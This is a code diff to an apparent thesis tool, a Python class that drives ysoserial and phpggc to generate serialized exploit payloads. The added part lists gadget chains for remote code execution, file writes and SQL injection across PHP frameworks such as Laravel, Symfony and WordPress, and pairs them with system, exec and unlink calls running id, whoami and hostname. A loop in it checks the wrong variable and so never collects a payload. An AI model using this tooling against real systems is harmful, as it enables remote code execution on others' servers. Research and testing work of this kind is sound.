@@ -5,7 +5,7 @@ import os
 
 class PayloadMutation:
 
-    YSOSERIAL_PATH = "D:\\Thesis\\Analyze\\third_tool\\ysoserial-all.jar"
+    YSOSERIAL_PATH = "D:\\Thesis\\Analyze\\third_tool\\java\\ysoserial-all.jar"
 
     TEST_COMMANDS = ["id", "whoami", "hostname"]
 
@@ -149,3 +149,221 @@ class PayloadMutation:
             return [payload]
 
         return []
+    
+    
+    PHPGGC_PATH = "D:\\Thesis\\Analyze\\third_tool\\phpggc"
+    
+    PHP_GADGET_CHAINS_MAP = {
+    "monolog": [
+        "Monolog/FW1",
+        "Monolog/RCE1",
+        "Monolog/RCE2",
+        "Monolog/RCE3",
+        "Monolog/RCE4",
+        "Monolog/RCE5",
+        "Monolog/RCE6",
+        "Monolog/RCE7",
+        "Monolog/RCE8",
+        "Monolog/RCE9",
+    ],
+    "guzzle": [
+        "Guzzle/FW1",
+        "Guzzle/INFO1",
+        "Guzzle/RCE1",
+    ],
+    "swiftmailer": [
+        "SwiftMailer/FD1",
+        "SwiftMailer/FD2",
+        "SwiftMailer/FR1",
+        "SwiftMailer/FW1",
+        "SwiftMailer/FW2",
+        "SwiftMailer/FW3",
+        "SwiftMailer/FW4",
+    ],
+    "laravel": [
+        "Laravel/FD1",
+        "Laravel/RCE1",
+        "Laravel/RCE2",
+        "Laravel/RCE3",
+        "Laravel/RCE4",
+        "Laravel/RCE5",
+        "Laravel/RCE6",
+        "Laravel/RCE7",
+        "Laravel/RCE8",
+        "Laravel/RCE9",
+        "Laravel/RCE10",
+        "Laravel/RCE11",
+        "Laravel/RCE12",
+        "Laravel/RCE13",
+        "Laravel/RCE14",
+        "Laravel/RCE15",
+        "Laravel/RCE16",
+        "Laravel/RCE17",
+        "Laravel/RCE18",
+        "Laravel/RCE19",
+        "Laravel/RCE20",
+        "Laravel/RCE21",
+        "Laravel/RCE22",
+    ],
+    "symfony": [
+        "Symfony/FD1",
+        "Symfony/FW1",
+        "Symfony/FW2",
+        "Symfony/RCE1",
+        "Symfony/RCE2",
+        "Symfony/RCE3",
+        "Symfony/RCE4",
+        "Symfony/RCE5",
+        "Symfony/RCE6",
+        "Symfony/RCE7",
+        "Symfony/RCE8",
+        "Symfony/RCE9",
+        "Symfony/RCE10",
+        "Symfony/RCE11",
+        "Symfony/RCE12",
+        "Symfony/RCE13",
+        "Symfony/RCE14",
+        "Symfony/RCE15",
+        "Symfony/RCE16",
+    ],
+    "yii": [
+        "Yii/RCE1",
+        "Yii/RCE2",
+        "Yii2/RCE1",
+        "Yii2/RCE2",
+    ],
+    "zend": [
+        "ZendFramework/FD1",
+        "ZendFramework/RCE1",
+        "ZendFramework/RCE2",
+        "ZendFramework/RCE3",
+        "ZendFramework/RCE4",
+        "ZendFramework/RCE5",
+    ],
+    "codeigniter": [
+        "CodeIgniter4/FD1",
+        "CodeIgniter4/FD2",
+        "CodeIgniter4/FR1",
+        "CodeIgniter4/RCE1",
+        "CodeIgniter4/RCE2",
+        "CodeIgniter4/RCE3",
+        "CodeIgniter4/RCE4",
+        "CodeIgniter4/RCE5",
+        "CodeIgniter4/RCE6",
+    ],
+    "slim": [
+        "Slim/RCE1",
+    ],
+    "wordpress": [
+        "WordPress/RCE1",
+        "WordPress/RCE2",
+        "WordPress/Dompdf/RCE1",
+        "WordPress/Dompdf/RCE2",
+        "WordPress/Guzzle/RCE1",
+        "WordPress/Guzzle/RCE2",
+        "WordPress/P/WooCommerce/RCE1",
+        "WordPress/P/WooCommerce/RCE2",
+        "WordPress/P/YoastSEO/FW1",
+    ],
+    "drupal": [
+        "Drupal/AT1",
+        "Drupal/FD1",
+        "Drupal/RCE1",
+        "Drupal/SQLI1",
+        "Drupal/SSRF1",
+        "Drupal/XXE1",
+        "Drupal7/FD1",
+        "Drupal7/RCE1",
+        "Drupal7/SQLI1",
+        "Drupal7/SSRF1",
+        "Drupal9/RCE1",
+    ],
+    "joomla": [
+        "Joomla/FW1",
+    ],
+    "doctrine": [
+        "Doctrine/FW1",
+        "Doctrine/FW2",
+        "Doctrine/RCE1",
+        "Doctrine/RCE2",
+    ],
+    "thinkphp": [
+        "ThinkPHP/FW1",
+        "ThinkPHP/FW2",
+        "ThinkPHP/RCE1",
+        "ThinkPHP/RCE2",
+        "ThinkPHP/RCE3",
+        "ThinkPHP/RCE4",
+    ],
+    "typo3": [
+        "Typo3/FD1",
+    ],
+    "cakephp": [
+        "CakePHP/RCE1",
+        "CakePHP/RCE2",
+    ],
+    "magento": [
+        "Magento/FW1",
+        "Magento/SQLI1",
+        "Magento2/FD1",
+        "Magento2/FD2",
+    ],
+}
+    PHP_TYPE = {
+        "system",
+        "exec",
+        "passthru",
+        "unlink"
+    }
+    def _get_php_version(self) -> str:
+        try:
+            result = subprocess.run(["php", "-version"], capture_output=True, text=True)
+            output = result.stdout + result.stderr
+            if "PHP 5." in output: return "5"
+            if "PHP 7." in output: return "7"
+            if "PHP 8." in output: return "8"
+            return "unknown"
+        except Exception:
+            return "unknown"
+        
+    def _php_mutation(self) -> list[dict]:
+        results = []
+        
+        chains = self.__resolve_php_chain()
+        if not os.path.exists(self.PHPGGC_PATH):
+            return [{
+                "error": "phpggc not found",
+                "hint":  f"Place phpggc at: {self.PHPGGC_PATH}"
+            }] 
+        for chain in chains:
+            for ptype in self.PHP_TYPE:
+                for cmd in self.TEST_COMMANDS:
+                    result = self._run_phpggc(chain, ptype, cmd)
+                    if results:
+                        results.append(self._make_payload("php_object", chain, cmd, result))
+                        print(f"[+] Generated: {chain}")
+                        
+        return results
+    
+    
+    def _run_phpggc(self, chain: str,type:str, command: str) -> str | None:
+        try:
+            cmd   = ["php"]  + [self.PHPGGC_PATH, chain,type, command,"-b"]
+            result = subprocess.run(cmd, capture_output=True, timeout=15)
+
+            if result.returncode == 0 and result.stdout:
+                return result.stdout.decode().strip() 
+            return None 
+        except subprocess.TimeoutExpired:
+            print(f"[!] Timeout: {chain}")
+            return None
+        except FileNotFoundError:
+            print("[!] php not found")
+            return None
+        
+    def __resolve_php_chain(self) -> list[str]:
+        for key, chain in self.PHP_GADGET_CHAINS_MAP.items():
+            if key.lower() in self.etype.lower() and chain:
+                return chain
+        return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
+        
